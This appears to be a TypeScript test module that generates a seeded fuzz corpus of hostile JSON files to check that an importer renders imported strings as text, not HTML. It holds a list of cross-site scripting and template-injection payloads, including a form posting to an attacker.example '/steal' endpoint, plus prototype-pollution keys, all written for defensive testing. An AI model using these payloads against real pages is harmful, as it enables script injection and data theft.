// The fuzzed-import corpus (ARCHITECTURE.md section 5.7: "Replies render as text ... W1-T14's acceptance, a fuzzed import never
// renders as HTML, is a GATE-bundle test"). Every hostile string carries a marker attribute, data-ss-fuzz, so the test can tell
// markup the page parsed (an element with the attribute exists) from text the page showed (the characters are on the page and
// no element has the attribute). The corpus is seeded: the same seed gives the same files on every run, on every machine.

/** A test parameter [D], not a tool fact: changing it changes the corpus and nothing else. */
export const FUZZ_SEED = 0x5eed41

export function mulberry32(seed: number): () => number {
  let a = seed >>> 0
  return () => {
    a = (a + 0x6d2b79f5) >>> 0
    let t = a
    t = Math.imul(t ^ (t >>> 15), t | 1)
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61)
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296
  }
}

/** Markup that runs script or restyles the page if a page parses it, each with a marker the test looks for. */
export const HOSTILE_STRINGS: readonly string[] = [
  '<img data-ss-fuzz="1" src="x" onerror="window.__ssPwn=1">',
  '<svg data-ss-fuzz="2" onload="window.__ssPwn=1"></svg>',
  '<script data-ss-fuzz="3">window.__ssPwn=1</script>',
  '"><b data-ss-fuzz="4">bold</b>',
  '<a data-ss-fuzz="5" href="javascript:window.__ssPwn=1">go</a>',
  '<iframe data-ss-fuzz="6" srcdoc="<script>parent.__ssPwn=1</script>"></iframe>',
  '<style data-ss-fuzz="7">*{display:none!important}</style>',
  '<details data-ss-fuzz="8" open ontoggle="window.__ssPwn=1"><summary>x</summary></details>',
  '<form data-ss-fuzz="9" action="https://attacker.example/steal"><input name="q"></form>',
  '<meta data-ss-fuzz="10" http-equiv="refresh" content="0;url=https://attacker.example/">',
  '{{constructor.constructor("window.__ssPwn=1")()}}',
  '${window.__ssPwn=1}',
  '‮evil‬ \u0000 \ud800 </pre><p data-ss-fuzz="11">escape the verdict block</p>',
  '[link](javascript:window.__ssPwn=1) <!-- data-ss-fuzz="12" --> # heading',
]

export interface FuzzFile {
  name: string
  body: Buffer
  /** What the file is, for the failure message. */
  note: string
}

type Json = null | boolean | number | string | Json[] | { [k: string]: Json }

function pick<T>(rand: () => number, xs: readonly T[]): T {
  return xs[Math.floor(rand() * xs.length)] as T
}

/** Replace some strings anywhere in a document with hostile ones. */
function poison(value: Json, rand: () => number, rate: number): Json {
  if (typeof value === 'string') return rand() < rate ? pick(rand, HOSTILE_STRINGS) : value
  if (Array.isArray(value)) return value.map((v) => poison(v, rand, rate))
  if (value !== null && typeof value === 'object') {
    const out: { [k: string]: Json } = {}
    for (const [k, v] of Object.entries(value)) out[rand() < rate / 4 ? pick(rand, HOSTILE_STRINGS) : k] = poison(v, rand, rate)
    return out
  }
  return value
}

function paths(value: Json, prefix: (string | number)[] = []): (string | number)[][] {
  if (Array.isArray(value)) return value.flatMap((v, i) => paths(v, [...prefix, i]))
  if (value !== null && typeof value === 'object') return Object.entries(value).flatMap(([k, v]) => paths(v, [...prefix, k]))
  return [prefix]
}

function setAt(root: Json, path: (string | number)[], v: Json): Json {
  if (path.length === 0) return v
  const copy = structuredClone(root)
  let cur: any = copy
  for (const key of path.slice(0, -1)) cur = cur[key]
  cur[path[path.length - 1] as string | number] = v
  return copy
}

function deleteAt(root: Json, path: (string | number)[]): Json {
  const copy = structuredClone(root)
  let cur: any = copy
  for (const key of path.slice(0, -1)) cur = cur[key]
  const last = path[path.length - 1] as string | number
  if (Array.isArray(cur)) cur.splice(Number(last), 1)
  else delete cur[last]
  return copy
}

const nested = (depth: number): Json => {
  let v: Json = 'leaf'
  for (let i = 0; i < depth; i += 1) v = { a: v }
  return v
}

/**
 * Files for the importer: hostile strings in every field of a valid document, structural damage (a type changed, a key
 * removed, a prototype key, nesting past the limit of 64, a string past the witness cap), and bytes that are not JSON at all.
 * `base` is a valid document of the kind the importer takes (a receipt@1).
 */
export function fuzzCorpus(base: Json, seed: number = FUZZ_SEED, perKind = 3): FuzzFile[] {
  const rand = mulberry32(seed)
  const out: FuzzFile[] = []
  const add = (name: string, value: Json, note: string): void => void out.push({ name, body: Buffer.from(JSON.stringify(value)), note })
  const all = paths(base)

  for (let i = 0; i < perKind; i += 1) add(`hostile-${i}.json`, poison(base, rand, 0.6), 'hostile markup in the fields of a valid document')
  add('hostile-every-string.json', poison(base, rand, 1), 'hostile markup in every string')
  for (let i = 0; i < perKind; i += 1) {
    const p = pick(rand, all)
    add(`type-${i}.json`, setAt(base, p, pick(rand, [null, 7, true, [], {}, 'x'.repeat(10)] as Json[])), `a value of another type at ${p.join('/')}`)
  }
  for (let i = 0; i < perKind; i += 1) {
    const p = pick(rand, all)
    add(`missing-${i}.json`, deleteAt(base, p), `${p.join('/')} removed`)
  }
  add('proto-key.json', JSON.parse('{"__proto__":{"polluted":"<img data-ss-fuzz=\\"13\\" src=x>"},"constructor":{"prototype":{"x":1}},"prototype":1,"lab":"LAB-1"}') as Json, 'prototype keys at the top level')
  add('deep.json', nested(200), 'nesting of depth 200, past the limit of 64')
  add('long-string.json', { lab: 'LAB-1', note: `${HOSTILE_STRINGS[0]}${'A'.repeat(70_000)}` }, 'a string past the witness cap, starting with markup')
  add('many-values.json', Array.from({ length: 120_000 }, (_, i) => i), 'more than 100,000 values')
  out.push({ name: 'truncated.json', body: Buffer.from(JSON.stringify(base).slice(0, 200)), note: 'JSON cut short' })
  out.push({ name: 'bom.json', body: Buffer.concat([Buffer.from([0xef, 0xbb, 0xbf]), Buffer.from(JSON.stringify(poison(base, rand, 0.5)))]), note: 'a byte order mark, then hostile JSON' })
  out.push({ name: 'html.json', body: Buffer.from(`<!doctype html><html><body>${HOSTILE_STRINGS.join('')}</body></html>`), note: 'an HTML document where JSON is expected' })
  out.push({ name: 'binary.json', body: Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, ...Array.from({ length: 64 }, () => Math.floor(rand() * 256))]), note: 'binary bytes' })
  out.push({ name: 'empty.json', body: Buffer.alloc(0), note: 'an empty file' })
  out.push({ name: 'oversize.json', body: Buffer.from(`{"lab":"LAB-1","note":"${HOSTILE_STRINGS[0]?.replace(/"/g, '\\"')}${'B'.repeat(2_200_000)}"}`), note: 'a receipt file past the 2 MiB cap' })
  return out
}

/** An HTML-safe fragment payload for the canary test: a base64url JSON the main origin must never decode. */
export function fragmentCanary(tag: string): { token: string; encoded: string } {
  const token = `ss-fragment-canary-${tag}`
  const encoded = Buffer.from(JSON.stringify({ canary: token, spec: '(assert false)' })).toString('base64url')
  return { token, encoded }
}
